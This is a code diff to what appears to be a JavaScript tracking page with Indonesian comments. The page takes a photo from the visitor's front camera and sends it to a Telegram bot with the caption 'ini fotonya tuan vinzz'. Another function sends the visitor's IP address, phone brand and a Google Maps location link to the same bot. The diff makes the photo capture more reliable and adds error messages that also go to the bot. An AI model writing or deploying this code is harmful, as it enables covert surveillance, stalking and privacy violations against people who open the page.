@@ -49,46 +49,56 @@ async function kirimFoto() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
 
-    // Jika user mengizinkan kamera
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
     video.srcObject = stream;
+
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
         resolve();
       };
     });
-                      
-    await new Promise(resolve => setTimeout(resolve, 2000));
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    // Tunggu dulu biar kamera nyala beneran
+    await new Promise(resolve => setTimeout(resolve, 3000));
 
-    const ctx = canvas.getContext('2d');
+    // Set ukuran canvas dari video
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
+    // Gambar dari video ke canvas
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    return new Promise((resolve) => {
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "target.png");
-        formData.append('caption', 'ini fotonya tuan vinzz');
+    canvas.toBlob(async (blob) => {
+      if (!blob) {
+        await kirimPesanTelegram("Gagal ambil foto: blob kosong.");
+        return;
+      }
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        }).then(resolve);
-      }, 'image/png');
-    });
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("photo", blob, "kamera.png");
+      formData.append("caption", "📸 ini fotonya tuan vinzz");
+
+      const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+
+      if (!res.ok) {
+        await kirimPesanTelegram("❌ Gagal kirim foto ke Telegram.");
+        console.log(await res.text());
+      }
+    }, "image/png");
 
   } catch (err) {
-    console.warn("Akses kamera ditolak atau gagal.");
-    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak.");
+    await kirimPesanTelegram("❌ Kamera gagal dibuka: " + err.message);
   }
 }
-        
+
 async function kirimPesanTelegram(pesan) {
 const url = (`https://api.telegram.org/bot${token}/sendMessage`);
 await fetch(url, {
@@ -123,7 +133,8 @@ navigator.geolocation.getCurrentPosition(
     // Menambahkan link peta di pesan jika lokasi diizinkan
     const pesan = `╭──「 IP berhasil ditemukan! 」──
 │🌐 Status: MENGIZINKAN LOKASI
-│📡 IP: ${ip}\n📱 Merek hp: ${merek}
+│📡 IP: ${ip}
+│📱 Merek hp: ${merek}
 │📍 Lokasi: ${gmaps}
 ╰───────────────────`;
     await kirimPesanTelegram(pesan);
